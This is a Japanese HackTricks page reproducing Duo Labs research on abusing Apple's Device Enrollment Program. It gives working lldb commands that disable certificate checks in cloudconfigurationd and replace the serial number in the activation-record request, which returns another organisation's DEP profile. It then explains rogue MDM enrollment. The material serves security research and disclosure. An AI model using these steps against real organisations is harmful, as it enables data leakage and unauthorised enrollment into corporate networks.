# 他の組織にデバイスを登録する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## イントロ

[**以前にコメントしたように**](./#what-is-mdm-mobile-device-management)**、組織にデバイスを登録するためには、その組織に所属するシリアル番号が必要です**。デバイスが登録されると、複数の組織が新しいデバイスに機密データをインストールします：証明書、アプリケーション、WiFiパスワード、VPNの設定など[など](https://developer.apple.com/enterprise/documentation/Configuration-Profile-Reference.pdf)。\
したがって、登録プロセスが正しく保護されていない場合、これは攻撃者にとって危険なエントリーポイントとなる可能性があります。

**以下の研究は** [**https://duo.com/labs/research/mdm-me-maybe**](https://duo.com/labs/research/mdm-me-maybe) **から引用されています**

## プロセスの逆解析

### DEPとMDMに関与するバイナリ

私たちの研究では、以下のバイナリを調査しました：

* **`mdmclient`**：OSがMDMサーバーと通信するために使用されます。macOS 10.13.3以前では、DEPのチェックインもトリガーするために使用できます。
* **`profiles`**：macOS上で構成プロファイルをインストール、削除、表示するために使用できるユーティリティです。macOS 10.13.4以降では、DEPのチェックインもトリガーするために使用できます。
* **`cloudconfigurationd`**：デバイス登録クライアントデーモンであり、DEP APIと通信し、デバイス登録プロファイルを取得する責任があります。

`mdmclient`または`profiles`を使用してDEPのチェックインを開始する場合、`CPFetchActivationRecord`および`CPGetActivationRecord`関数が_アクティベーションレコード_を取得するために使用されます。`CPFetchActivationRecord`は[XPC](https://developer.apple.com/documentation/xpc)を介して`cloudconfigurationd`に制御を委譲し、DEP APIから_アクティベーションレコード_を取得します。

`CPGetActivationRecord`はキャッシュから_アクティベーションレコード_を取得します（利用可能な場合）。これらの関数は、`/System/Library/PrivateFrameworks/Configuration Profiles.framework`にある非公開の構成プロファイルフレームワークで定義されています。

### TeslaプロトコルとAbsintheスキームの逆解析

DEPのチェックインプロセス中、`cloudconfigurationd`は_iprofiles.apple.com/macProfile_から_アクティベーションレコード_を要求します。リクエストペイロードは、2つのキーと値のペアを含むJSON辞書です：
```
{
"sn": "",
action": "RequestProfileConfiguration
}
```
ペイロードは、内部的に「アブサンス」と呼ばれるスキームを使用して署名と暗号化されます。暗号化されたペイロードは、Base 64でエンコードされ、HTTP POSTのリクエストボディとして _iprofiles.apple.com/macProfile_ に使用されます。

`cloudconfigurationd`では、_Activation Record_ の取得は `MCTeslaConfigurationFetcher` クラスによって処理されます。 `[MCTeslaConfigurationFetcher enterState:]` からの一般的なフローは次のようになります：
```
rsi = @selector(verifyConfigBag);
rsi = @selector(startCertificateFetch);
rsi = @selector(initializeAbsinthe);
rsi = @selector(startSessionKeyFetch);
rsi = @selector(establishAbsintheSession);
rsi = @selector(startConfigurationFetch);
rsi = @selector(sendConfigurationInfoToRemote);
rsi = @selector(sendFailureNoticeToRemote);
```
**Absinthe**スキームは、DEPサービスへのリクエストを認証するために使用されるようです。このスキームを**リバースエンジニアリング**することで、DEP APIへの認証済みリクエストを作成することができます。ただし、リクエストの認証に関与する手順の数が多いため、時間がかかることがわかりました。このスキームの動作を完全にリバースエンジニアリングする代わりに、_Activation Record_ リクエストの一部として任意のシリアル番号を挿入する他の方法を探ることにしました。

### DEPリクエストのMITM

[Charles Proxy](https://www.charlesproxy.com)を使用して、_iprofiles.apple.com_へのネットワークリクエストをプロキシする可能性を調査しました。私たちの目標は、_iprofiles.apple.com/macProfile_に送信されるペイロードを検査し、任意のシリアル番号を挿入してリクエストを再生することです。先に述べたように、`cloudconfigurationd`によってそのエンドポイントに送信されるペイロードは、[JSON](https://www.json.org)形式であり、2つのキーと値のペアを含んでいます。
```
{
"action": "RequestProfileConfiguration",
sn": "
}
```
APIの_iprofiles.apple.com_では[Transport Layer Security](https://en.wikipedia.org/wiki/Transport\_Layer\_Security)（TLS）が使用されているため、SSLプロキシを有効にする必要があります。これにより、SSLリクエストの平文コンテンツを見ることができます。

ただし、`-[MCTeslaConfigurationFetcher connection:willSendRequestForAuthenticationChallenge:]`メソッドは、サーバー証明書の妥当性をチェックし、サーバーの信頼性が確認できない場合には中止します。
```
[ERROR] Unable to get activation record: Error Domain=MCCloudConfigurationErrorDomain Code=34011
"The Device Enrollment server trust could not be verified. Please contact your system
administrator." UserInfo={USEnglishDescription=The Device Enrollment server trust could not be
verified. Please contact your system administrator., NSLocalizedDescription=The Device Enrollment
server trust could not be verified. Please contact your system administrator.,
MCErrorType=MCFatalError}
```
上記のエラーメッセージは、`CLOUD_CONFIG_SERVER_TRUST_ERROR`というキーを持つバイナリの_Errors.strings_ファイルにあります。このファイルは`/System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings`にあり、他の関連するエラーメッセージと共に配置されています。
```
$ cd /System/Library/CoreServices
$ rg "The Device Enrollment server trust could not be verified"
ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
<snip>
```
_Errors.strings_ファイルは、組み込みの`plutil`コマンドを使用して、[人間が読める形式で印刷することができます](https://duo.com/labs/research/mdm-me-maybe#error\_strings\_output)。
```
$ plutil -p /System/Library/CoreServices/ManagedClient.app/Contents/Resources/English.lproj/Errors.strings
```
## Enrolling Devices in Other Organisations

`MCTeslaConfigurationFetcher`クラスをさらに調査した結果、このサーバーの信頼性の振る舞いは、`com.apple.ManagedClient.cloudconfigurationd`設定ドメインの`MCCloudConfigAcceptAnyHTTPSCertificate`構成オプションを有効にすることで回避できることが明らかになりました。
```
loc_100006406:
rax = [NSUserDefaults standardUserDefaults];
rax = [rax retain];
r14 = [rax boolForKey:@"MCCloudConfigAcceptAnyHTTPSCertificate"];
r15 = r15;
[rax release];
if (r14 != 0x1) goto loc_10000646f;
```
`MCCloudConfigAcceptAnyHTTPSCertificate`構成オプションは、`defaults`コマンドを使用して設定することができます。
```
sudo defaults write com.apple.ManagedClient.cloudconfigurationd MCCloudConfigAcceptAnyHTTPSCertificate -bool yes
```
SSLプロキシを有効にして、`cloudconfigurationd`が任意のHTTPS証明書を受け入れるように設定した場合、私たちはCharles Proxyで中間者攻撃を試み、リクエストを再送信しました。

ただし、HTTP POSTリクエストのボディに含まれるペイロードはAbsinthe（`NACSign`）で署名および暗号化されているため、**平文のJSONペイロードを任意のシリアル番号を含めて変更することはできません。それを復号化するためのキーも必要です**。キーはメモリに残っているため、取得することは可能ですが、代わりに`cloudconfigurationd`を[LLDB](https://lldb.llvm.org)デバッガで調査することにしました。

### DEPとやり取りするシステムバイナリのインストゥルメンテーション

_arbitrary serial numbers_を_iprofiles.apple.com/macProfile_に送信するプロセスを自動化するために、最後に試した方法は、DEP APIと直接または間接的にやり取りするネイティブバイナリにインストゥルメンテーションを行うことでした。これには、`mdmclient`、`profiles`、および`cloudconfigurationd`を[Hopper v4](https://www.hopperapp.com)と[Ida Pro](https://www.hex-rays.com/products/ida/)で初期の調査を行い、`lldb`を使用して長時間のデバッグセッションを行いました。

この方法の利点の1つは、バイナリを変更して独自のキーで再署名する方法よりも、macOSに組み込まれた権限制限に回避することができることです。

**システム整合性保護**

macOS上のシステムバイナリ（`cloudconfigurationd`など）にインストゥルメンテーションを行うためには、[システム整合性保護](https://support.apple.com/en-us/HT204899)（SIP）を無効にする必要があります。SIPは、システムレベルのファイル、フォルダ、およびプロセスを改ざんから保護するセキュリティ技術であり、OS X 10.11 "El Capitan"以降ではデフォルトで有効になっています。[SIPは、リカバリーモードに起動してターミナルアプリケーションで次のコマンドを実行し、再起動することで無効にできます](https://developer.apple.com/library/archive/documentation/Security/Conceptual/System_Integrity_Protection_Guide/ConfiguringSystemIntegrityProtection/ConfiguringSystemIntegrityProtection.html)。
```
csrutil enable --without debug
```
ただし、SIPは有用なセキュリティ機能であり、本番マシン以外の研究やテスト目的以外では無効にするべきではありません。ホストオペレーティングシステムではなく、重要でない仮想マシン上で行うことも可能です。

**LLDBを使用したバイナリインストゥルメンテーション**

SIPを無効にした後、DEP APIとやり取りするシステムバイナリ（`cloudconfigurationd`バイナリ）に対してインストゥルメンテーションを進めることができました。`cloudconfigurationd`は昇格された特権で実行する必要があるため、`lldb`を`sudo`で起動する必要があります。
```
$ sudo lldb
(lldb) process attach --waitfor --name cloudconfigurationd
```
`lldb`が待機している間に、別のターミナルウィンドウで`sudo /usr/libexec/mdmclient dep nag`を実行して`cloudconfigurationd`にアタッチすることができます。アタッチされると、以下のような出力が表示され、LLDBコマンドをプロンプトで入力することができます。
```
Process 861 stopped
* thread #1, stop reason = signal SIGSTOP
<snip>
Target 0: (cloudconfigurationd) stopped.

Executable module set to "/usr/libexec/cloudconfigurationd".
Architecture set to: x86_64h-apple-macosx.
(lldb)
```
**デバイスシリアル番号の設定**

`mdmclient`と`cloudconfigurationd`をリバースエンジニアリングする際に最初に探したのは、システムのシリアル番号を取得するコードでした。シリアル番号はデバイスの認証に最終的に責任を持っているため、私たちの目標は、`IORegistry`から取得されたシリアル番号をメモリ内で変更し、`cloudconfigurationd`が`macProfile`ペイロードを構築する際に使用されるようにすることでした。

`cloudconfigurationd`はDEP APIとの通信に責任を持っていますが、`mdmclient`内でシステムのシリアル番号が直接取得または使用されるかどうかも調査しました。以下に示すように取得されるシリアル番号はDEP APIに送信されるものではありませんが、特定の設定オプションが有効になっている場合に使用されるハードコードされたシリアル番号が明らかになりました。
```
int sub_10002000f() {
if (sub_100042b6f() != 0x0) {
r14 = @"2222XXJREUF";
}
else {
rax = IOServiceMatching("IOPlatformExpertDevice");
rax = IOServiceGetMatchingServices(*(int32_t *)*_kIOMasterPortDefault, rax, &var_2C);
<snip>
}
rax = r14;
return rax;
}
```
システムのシリアル番号は、[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から取得されます。ただし、`sub_10002000f`の返り値がゼロ以外の場合は、静的な文字列「2222XXJREUF」に設定されます。その関数を調査すると、「サーバーストレステストモード」が有効化されているかどうかをチェックしているようです。
```
void sub_1000321ca(void * _block) {
if (sub_10002406f() != 0x0) {
*(int8_t *)0x100097b68 = 0x1;
sub_10000b3de(@"Server stress test mode enabled", rsi, rdx, rcx, r8, r9, stack[0]);
}
return;
}
```
私たちは「サーバーストレステストモード」の存在を文書化しましたが、DEP APIに表示されるシリアル番号を変更することが目標であったため、それ以上は探求しませんでした。代わりに、`r14`レジスタが指すシリアル番号を変更することで、テスト中のマシンには意図されていない「アクティベーションレコード」を取得できるかどうかをテストしました。

次に、`cloudconfigurationd`内でシステムのシリアル番号がどのように取得されるかを調査しました。
```
int sub_10000c100(int arg0, int arg1, int arg2, int arg3) {
var_50 = arg3;
r12 = arg2;
r13 = arg1;
r15 = arg0;
rbx = IOServiceGetMatchingService(*(int32_t *)*_kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"));
r14 = 0xffffffffffff541a;
if (rbx != 0x0) {
rax = sub_10000c210(rbx, @"IOPlatformSerialNumber", 0x0, &var_30, &var_34);
r14 = rax;
<snip>
}
rax = r14;
return rax;
}
```
上記のように、シリアル番号は`cloudconfigurationd`内の[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から取得されます。

`lldb`を使用して、`IOServiceGetMatchingService`のブレークポイントを設定し、任意のシリアル番号を含む新しい文字列変数を作成し、`r14`レジスタを作成した変数のメモリアドレスを指すように書き換えることで、[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から取得されるシリアル番号を変更することができました。
```
(lldb) breakpoint set -n IOServiceGetMatchingService
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --waitfor --name cloudconfigurationd
Process 2208 stopped
* thread #2, queue = 'com.apple.NSXPCListener.service.com.apple.ManagedClient.cloudconfigurationd',
stop reason = instruction step over frame #0: 0x000000010fd824d8
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd + 73
cloudconfigurationd`___lldb_unnamed_symbol2$$cloudconfigurationd:
->  0x10fd824d8 <+73>: movl   %ebx, %edi
0x10fd824da <+75>: callq  0x10ffac91e               ; symbol stub for: IOObjectRelease
0x10fd824df <+80>: testq  %r14, %r14
0x10fd824e2 <+83>: jne    0x10fd824e7               ; <+88>
Target 0: (cloudconfigurationd) stopped.
(lldb) continue  # Will hit breakpoint at `IOServiceGetMatchingService`
# Step through the program execution by pressing 'n' a bunch of times and
# then 'po $r14' until we see the serial number.
(lldb) n
(lldb) po $r14
C02JJPPPQQQRR  # The system serial number retrieved from the `IORegistry`
# Create a new variable containing an arbitrary serial number and print the memory address.
(lldb) p/x @"C02XXYYZZNNMM"
(__NSCFString *) $79 = 0x00007fb6d7d05850 @"C02XXYYZZNNMM"
# Rewrite the `r14` register to point to our new variable.
(lldb) register write $r14 0x00007fb6d7d05850
(lldb) po $r14
# Confirm that `r14` contains the new serial number.
C02XXYYZZNNMM
```
[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)から取得したシリアル番号を変更することには成功しましたが、`macProfile`ペイロードには、`r14`レジスタに書き込んだシリアル番号ではなく、システムのシリアル番号が含まれていました。

**Exploit: JSONシリアル化前のプロファイルリクエスト辞書の変更**

次に、`macProfile`ペイロードで送信されるシリアル番号を別の方法で設定してみました。今回は、[`IORegistry`](https://developer.apple.com/documentation/installerjs/ioregistry)を介して取得したシステムのシリアル番号を変更するのではなく、Absinthe（`NACSign`）で署名される前の平文のままのシリアル番号があるコードの最も近い箇所を見つけることを試みました。調査した結果、最も適切な箇所は `-[MCTeslaConfigurationFetcher startConfigurationFetch]` でした。このメソッドはおおよそ以下の手順を実行します：

* 新しい `NSMutableData` オブジェクトを作成します
* 新しい `NSMutableData` オブジェクトを引数にして `[MCTeslaConfigurationFetcher setConfigurationData:]` を呼び出します
* `[MCTeslaConfigurationFetcher profileRequestDictionary]` を呼び出し、2つのキーと値を含む `NSDictionary` オブジェクトを返します：
* `sn`: システムのシリアル番号
* `action`: 実行するリモートアクション（`sn` を引数として持つ）
* `[NSJSONSerialization dataWithJSONObject:]` を呼び出し、`profileRequestDictionary` から取得した `NSDictionary` を渡します
* Absinthe（`NACSign`）を使用してJSONペイロードに署名します
* 署名されたJSONペイロードをBase64エンコードします
* HTTPメソッドを `POST` に設定します
* HTTPボディをBase64エンコードされた署名済みJSONペイロードに設定します
* `X-Profile-Protocol-Version` HTTPヘッダを `1` に設定します
* `User-Agent` HTTPヘッダを `ConfigClient-1.0` に設定します
* `[NSURLConnection alloc] initWithRequest:delegate:startImmediately:]` メソッドを使用してHTTPリクエストを実行します

次に、JSONに変換される前の`profileRequestDictionary`から返される`NSDictionary`オブジェクトを変更しました。これを行うために、`dataWithJSONObject`にブレークポイントを設定して、変換されていないデータにできるだけ近づけました。ブレークポイントは成功し、アセンブリコードを通じて知っているレジスタの内容（`rdx`）を印刷したとき、期待した結果が得られたことがわかりました。
```
po $rdx
{
action = RequestProfileConfiguration;
sn = C02XXYYZZNNMM;
}
```
上記は、`[MCTeslaConfigurationFetcher profileRequestDictionary]` によって返される `NSDictionary` オブジェクトの整形表示です。次の課題は、シリアル番号を含むメモリ上の `NSDictionary` を変更することでした。
```
(lldb) breakpoint set -r "dataWithJSONObject"
# Run `sudo /usr/libexec/mdmclient dep nag` in a separate Terminal window.
(lldb) process attach --name "cloudconfigurationd" --waitfor
Process 3291 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x00007fff2e8bfd8f Foundation`+[NSJSONSerialization dataWithJSONObject:options:error:]
Target 0: (cloudconfigurationd) stopped.
# Hit next breakpoint at `dataWithJSONObject`, since the first one isn't where we need to change the serial number.
(lldb) continue
# Create a new variable containing an arbitrary `NSDictionary` and print the memory address.
(lldb) p/x (NSDictionary *)[[NSDictionary alloc] initWithObjectsAndKeys:@"C02XXYYZZNNMM", @"sn",
@"RequestProfileConfiguration", @"action", nil]
(__NSDictionaryI *) $3 = 0x00007ff068c2e5a0 2 key/value pairs
# Confirm that `rdx` contains the new `NSDictionary`.
po $rdx
{
action = RequestProfileConfiguration;
sn = <new_serial_number>
}
```
上記のリストは以下の操作を行います：

* `dataWithJSONObject` セレクターに対する正規表現ブレークポイントを作成します。
* `cloudconfigurationd` プロセスが開始されるのを待ち、それにアタッチします。
* プログラムの実行を `continue` します（`dataWithJSONObject` に対して最初にヒットしたブレークポイントは `profileRequestDictionary` で呼び出されたものではないため）。
* 任意の `NSDictionary` を作成し、結果を16進数形式で出力します（`/x` によるもの）。
* 必要なキーの名前を既に知っているため、`sn` のシリアル番号を選択したものに設定し、`action` はそのままにします。
* この新しい `NSDictionary` を作成した結果の出力により、特定のメモリ位置に2つのキーと値のペアがあることがわかります。

最後のステップは、選択したシリアル番号を含むカスタム `NSDictionary` オブジェクトのメモリ位置を `rdx` に書き込むという同じ手順を繰り返すことでした。
```
(lldb) register write $rdx 0x00007ff068c2e5a0  # Rewrite the `rdx` register to point to our new variable
(lldb) continue
```
以下のコードは、新しい`NSDictionary`を`rdx`レジスタに指定し、それが[JSON](https://www.json.org)にシリアル化され、_iprofiles.apple.com/macProfile_に`POST`される直前のプログラムフローを示しています。

この方法による、プロファイルリクエストの辞書内のシリアル番号の変更は成功しました。`(null)`の代わりに、既知の正常なDEP登録されたAppleのシリアル番号を使用すると、`ManagedClient`のデバッグログにはデバイスの完全なDEPプロファイルが表示されました。
```
Apr  4 16:21:35[660:1]:+CPFetchActivationRecord fetched configuration:
{
AllowPairing = 1;
AnchorCertificates =     (
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://some.url/cloudenroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "Org address";
OrganizationAddressLine1 = "More address";
OrganizationAddressLine2 = NULL;
OrganizationCity = A City;
OrganizationCountry = US;
OrganizationDepartment = "Org Dept";
OrganizationEmail = "dep.management@org.url";
OrganizationMagic = <unique string>;
OrganizationName = "ORG NAME";
OrganizationPhone = "+1551234567";
OrganizationSupportPhone = "+15551235678";
OrganizationZipCode = "ZIPPY";
SkipSetup =     (
AppleID,
Passcode,
Zoom,
Biometric,
Payment,
TOS,
TapToSetup,
Diagnostics,
HomeButtonSensitivity,
Android,
Siri,
DisplayTone,
ScreenSaver
);
SupervisorHostCertificates =     (
);
}
```
わずかな`lldb`コマンドで、任意のシリアル番号を挿入し、組織固有のデータを含むDEPプロファイルを取得することができます。この登録URLは、シリアル番号がわかっている場合に、ローグデバイスを登録するために使用することができます。他のデータは、ローグ登録を社会工学的に行うために使用することができます。登録後、デバイスは証明書、プロファイル、アプリケーション、VPN設定などを受け取ることができます。

### Pythonを使用した`cloudconfigurationd`の自動化

シリアル番号だけを使用して有効なDEPプロファイルを取得する方法をデモンストレーションする初期の概念証明ができたら、認証の脆弱性を悪用する攻撃者の方法を自動化することを目指しました。

幸いにも、LLDB APIは[スクリプトブリッジングインターフェース](https://lldb.llvm.org/python-reference.html)を介してPythonで利用できます。[Xcode Command Line Tools](https://developer.apple.com/download/more/)がインストールされているmacOSシステムでは、`lldb`のPythonモジュールを次のようにインポートすることができます：
```
import lldb
```
これにより、DEPに登録されたシリアル番号を挿入し、有効なDEPプロファイルを受け取る方法をデモンストレーションするためのプルーフオブコンセプトのスクリプト化が比較的容易になりました。開発したPoCは、改行で区切られたシリアル番号のリストを取り、それらを`cloudconfigurationd`プロセスに注入してDEPプロファイルをチェックします。

![Charles SSL Proxying Settings.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2NoYXJsZXNfc3NsX3Byb3h5aW5nX3NldHRpbmdzLnBuZw==?w=800\&fit=contain\&s=d1c9216716bf619e7e10e45c9968f83b)

![DEP Notification.](https://duo.com/img/asset/aW1nL2xhYnMvcmVzZWFyY2gvaW1nL2RlcF9ub3RpZmljYXRpb24ucG5n?w=800\&fit=contain\&s=4f7b95efd02245f9953487dcaac6a961)

### 影響

Appleのデバイス登録プログラム（DEP）は、組織に関する機密情報を公開する可能性がある様々なシナリオで悪用される可能性があります。最も明らかな2つのシナリオは、デバイスが所属する組織に関する情報を取得することで、これはDEPプロファイルから取得できます。2番目は、この情報を使用して不正なDEPおよびMDM登録を実行することです。それぞれについて詳しく説明します。

#### 情報の漏洩

前述のように、DEPの登録プロセスの一部は、DEP APIから_アクティベーションレコード_（またはDEPプロファイル）を要求して受け取ることです。有効なDEP登録システムのシリアル番号を提供することで、次の情報を取得できます（macOSのバージョンによっては`stdout`に出力されるか、`ManagedClient`ログに書き込まれるかのいずれか）。
```
Activation record: {
AllowPairing = 1;
AnchorCertificates =     (
<array_of_der_encoded_certificates>
);
AwaitDeviceConfigured = 0;
ConfigurationURL = "https://example.com/enroll";
IsMDMUnremovable = 1;
IsMandatory = 1;
IsSupervised = 1;
OrganizationAddress = "123 Main Street, Anywhere, , 12345 (USA)";
OrganizationAddressLine1 = "123 Main Street";
OrganizationAddressLine2 = NULL;
OrganizationCity = Anywhere;
OrganizationCountry = USA;
OrganizationDepartment = "IT";
OrganizationEmail = "dep@example.com";
OrganizationMagic = 105CD5B18CE24784A3A0344D6V63CD91;
OrganizationName = "Example, Inc.";
OrganizationPhone = "+15555555555";
OrganizationSupportPhone = "+15555555555";
OrganizationZipCode = "12345";
SkipSetup =     (
<array_of_setup_screens_to_skip>
);
SupervisorHostCertificates =     (
);
}
```
#### ローグDEP登録

[Apple MDMプロトコル](https://developer.apple.com/enterprise/documentation/MDM-Protocol-Reference.pdf)は、MDM登録前にユーザー認証をサポートしていますが、[HTTPベーシック認証](https://en.wikipedia.org/wiki/Basic\_access\_authentication)は必須ではありません。**認証がない場合、DEPに登録されたシリアル番号があれば、デバイスをMDMサーバーに登録するために必要なものはすべてです**。したがって、攻撃者はそのようなシリアル番号を入手すると、（OSINT、ソーシャルエンジニアリング、またはブルートフォースを介して）組織の所有物であるかのように自分のデバイスを登録することができます。ただし、現在MDMサーバーに登録されていない限りです。基本的に、攻撃者が本物のデバイスよりもDEP登録を開始することに成功すれば、そのデバイスの身分を引き継ぐことができます。

組織は、デバイスおよびユーザー証明書、VPN構成データ、登録エージェント、構成プロファイル、およびさまざまな他の内部データや組織の秘密など、機密情報を展開するためにMDMを活用することができます。また、一部の組織は、MDM登録の一環としてユーザー認証を必要としないことを選択しています。これには、より良いユーザーエクスペリエンスや、企業ネットワーク外で行われるMDM登録を処理するために内部認証サーバーをMDMサーバーに公開する必要がないなどの利点があります。

ただし、DEPを使用してMDM登録をブートストラップする場合、これは問題となります。攻撃者は、組織のMDMサーバーに自分が選んだエンドポイントを登録することができます。さらに、攻撃者がMDMに自分が選んだエンドポイントを正常に登録すると、ネットワーク内でさらなるピボットを行うために使用できる特権アクセスを取得することができます。
